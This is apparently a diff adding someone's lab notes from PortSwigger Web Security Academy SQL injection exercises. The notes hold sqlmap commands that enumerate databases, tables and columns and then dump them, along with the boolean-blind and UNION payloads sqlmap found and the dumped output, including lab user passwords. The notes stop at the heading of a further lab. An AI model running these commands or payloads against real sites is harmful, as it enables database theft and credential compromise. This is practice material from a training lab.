@@ -1,0 +1,179 @@
+------------------------------------------------------------
+github sqlmap
+ubuntu@ubuntu:~/sources/hack_proj$ sudo mkdir sql
+ubuntu@ubuntu:~/sources/hack_proj$ cd sql
+ubuntu@ubuntu:~/sources/hack_proj/sql$ sudo mkdir tools
+ubuntu@ubuntu:~/sources/hack_proj/sql$ cd tools/
+ubuntu@ubuntu:~/sources/hack_proj/sql/tools$  sudo git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+ubuntu@ubuntu:~/sources/hack_proj/sql/tools$ sudo snap install sqlmap
+
+
+
+######
+######sqlmap         Lab 1
+https://0a6e001e038d132484e52898001800ae.web-security-academy.net/filter?category=Pets
+inside pycharm
+		from termianl
+		f:
+		cd Master Telecom Engineering\CyberSecurity\Portswigger.com\sqlmap-master\sqlmap-master
+		
+		python sqlmap.py --banner --batch --random-agent -u -v https://0a9f0083033c2e5c802af49000550080.web-security-academy.net/filter?category=Gifts
+
+1) python sqlmap.py -u https://0aa600ed043c8707808d497d004b006c.web-security-academy.net/filter?category=Pets --banner --batch
+
+	result 
+back-end DBMS operating system: Linux Ubuntu
+back-end DBMS: PostgreSQL
+banner: 'PostgreSQL 12.20 (Ubuntu 12.20-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit'
+
+2) to skip dbase check again
+	python sqlmap.py -u http://testphp.vuln.com --dbms mysql --batch --random-agent
+	result 
+	back-end DBMS operating system: linux Ubuntu 'mysql'
+	back-end DBMS : MYSQL >=5.0.12
+	banner: '8.0.22-0 ubuntu 0.20.04.2'	
+	
+3)	to view all databases are used in site
+		python sqlmap.py -u https://0aa600ed043c8707808d497d004b006c.web-security-academy.net/filter?category=Pets --dbms PostgreSQL  --batch --random-agent --dbs
+result
+available databases [1]:
+[*] public
+
+4) tables inside public
+	python sqlmap.py -u https://0aa600ed043c8707808d497d004b006c.web-security-academy.net/filter?category=Pets --dbms PostgreSQL  --batch --random-agent -D public --tables
+result
+Database: public
+[1 table]
++----------+
+| products |
++----------+
+
+8) columns inside products
+ python sqlmap.py -u https://0a70007204b12ba3838f8807006000d5.web-security-academy.net/filter?category=Gifts --dbms PostgreSQL  --batch --random-agent -D public -T products --column
+Results
+Database: public
+Table: products
+[8 columns]
++-------------+---------+
+| Column      | Type    |
++-------------+---------+
+| description | varchar |
+| name        | varchar |
+| category    | varchar |
+| id          | int4    |
+| image       | varchar |
+| price       | int4    |
+| rating      | int4    |
+| released    | int4    |
++-------------+---------+
+
+9) to view values of columns
+
+
+
+python sqlmap.py -u https://0a70007204b12ba3838f8807006000d5.web-security-academy.net/filter?category=Gifts --dbms PostgreSQL  --batch --random-agent -D public -T products -C category,description,id,image,name,price,rating,released --dump
+
+
+python sqlmap.py -u https://0a70007204b12ba3838f8807006000d5.web-security-academy.net/filter?category=Gifts --dbms PostgreSQL  --batch --random-agent -D public -T products -C id,image,name,price,released --dump
+Database: public
+Table: products
+[20 entries]
++----+--------------------------------+--------------------------------+-------+----------+
+| id | name                           | image                          | price | released |
++----+--------------------------------+--------------------------------+-------+----------+
+| 1  | The Lazy Dog                   | productcatalog/products/25.jpg | 1108  | 0        |
+| 2  | What Do You Meme?              | productcatalog/products/68.jpg | 9260  | 0        |
+| 3  | Baby Minding Shoes             | productcatalog/products/72.jpg | 2717  | 0        |
+| 4  | High-End Gift Wrapping         | productcatalog/products/53.jpg | 7370  | 0        |
+| 5  | Real Life Photoshopping        | productcatalog/products/51.jpg | 6405  | 0        |
+| 6  | Pest Control Umbrella          | productcatalog/products/42.jpg | 9166  | 1        |
+| 7  | Roulette Drinking Game         | productcatalog/products/49.jpg | 6783  | 1        |
+| 8  | The Trolley-ON                 | productcatalog/products/27.jpg | 6768  | 1        |
+| 13 | First Impression Costumes      | productcatalog/products/43.jpg | 7996  | 1        |
+| 18 | Dancing In The Dark            | productcatalog/products/60.jpg | 9319  | 1        |
+| 9  | Snow Delivered To Your Door    | productcatalog/products/21.jpg | 3378  | 1        |
+| 14 | Conversation Controlling Lemon | productcatalog/products/7.jpg  | 8326  | 1        |
+| 19 | Couple's Umbrella              | productcatalog/products/31.jpg | 2572  | 1        |
+| 10 | Photobomb Backdrops            | productcatalog/products/16.jpg | 2147  | 1        |
+| 15 | Beat the Vacation Traffic      | productcatalog/products/73.jpg | 4647  | 1        |
+| 20 | Lightbulb Moments              | productcatalog/products/57.jpg | 6264  | 1        |
+| 11 | More Than Just Birdsong        | productcatalog/products/56.jpg | 9863  | 1        |
+| 16 | Babbage Web Spray              | productcatalog/products/22.jpg | 3054  | 1        |
+| 12 | The Bucket of Doom             | productcatalog/products/50.jpg | 4374  | 1        |
+| 17 | Weird Crushes Game             | productcatalog/products/62.jpg | 5358  | 1        |
++----+--------------------------------+--------------------------------+-------+----------+
+
+
+
+###############
+SQLMAP LAB 
+https://0a6e004a0435603881c3b6a300b3005e.web-security-academy.net/filter?category=Gifts
+
+		python sqlmap.py --banner --batch --random-agent -u -v https://0a6e004a0435603881c3b6a300b3005e.web-security-academy.net/filter?category=Gifts
+---
+Parameter: category (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: category=Gifts' AND 1300=1300 AND 'aZHa'='aZHa
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: category=Gifts' UNION ALL SELECT NULL,(CHR(113)||CHR(113)||CHR(122)||CHR(113)||CHR(113))||(CHR(117)||CHR(66)||CHR(114)||CHR(111)||CHR(85)||CHR(116)||C
+HR(89)||CHR(112)||CHR(104)||CHR(75)||CHR(82)||CHR(101)||CHR(101)||CHR(65)||CHR(102)||CHR(100)||CHR(122)||CHR(97)||CHR(120)||CHR(74)||CHR(74)||CHR(119)||CHR(87)||CH
+R(121)||CHR(85)||CHR(117)||CHR(89)||CHR(100)||CHR(66)||CHR(115)||CHR(117)||CHR(107)||CHR(69)||CHR(69)||CHR(66)||CHR(72)||CHR(110)||CHR(72)||CHR(84)||CHR(69))||(CHR
+(113)||CHR(120)||CHR(118)||CHR(118)||CHR(113))-- ciyV
+---
+[21:35:08] [INFO] testing PostgreSQL
+[21:35:09] [INFO] confirming PostgreSQL
+[21:35:09] [INFO] the back-end DBMS is PostgreSQL
+[21:35:09] [INFO] fetching banner
+back-end DBMS operating system: Linux Ubuntu
+back-end DBMS: PostgreSQL
+banner: 'PostgreSQL 12.20 (Ubuntu 12.20-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit'
+
+
+python sqlmap.py -u https://0a6e004a0435603881c3b6a300b3005e.web-security-academy.net/filter?category=Gifts --dbms PostgreSQL  --batch --random-agent --dbs
+
+available databases [1]:
+[*] public
+
+
+python sqlmap.py -u https://0a6e004a0435603881c3b6a300b3005e.web-security-academy.net/filter?category=Gifts  --dbms PostgreSQL  --batch --random-agent -D public --tables
+Database: public
+[2 tables]
++----------+
+| products |
+| users    |
++----------+
+ 
+ 
+ python sqlmap.py -u https://0a6e004a0435603881c3b6a300b3005e.web-security-academy.net/filter?category=Gifts  --dbms PostgreSQL  --batch --random-agent -D public -T users --columns
+ Database: public
+Table: users
+[3 columns]
++----------+---------+
+| Column   | Type    |
++----------+---------+
+| email    | varchar |
+| password | varchar |
+| username | varchar |
++----------+---------+
+
+
+ 
+ python sqlmap.py -u https://0a6e004a0435603881c3b6a300b3005e.web-security-academy.net/filter?category=Gifts  --dbms PostgreSQL  --batch --random-agent -D public -T users -C email,password,username --dump
+ 
+ Database: public
+Table: users
+[3 entries]
++-------+----------------------+---------------+
+| email | password             | username      |
++-------+----------------------+---------------+
+| NULL  | 4kcrlv26vvymdk2byyui | administrator |
+| NULL  | pa3yo6c1n450my1ruzne | wiener        |
+| NULL  | ejoifofbjouxfo3j5h68 | carlos        |
++-------+----------------------+---------------+
+
+----------------------------------------
+sqlmap lab
+https://0ac600a103cbd0b181ad3ecd007f00ab.web-security-academy.net/filter?category=Lifestyle
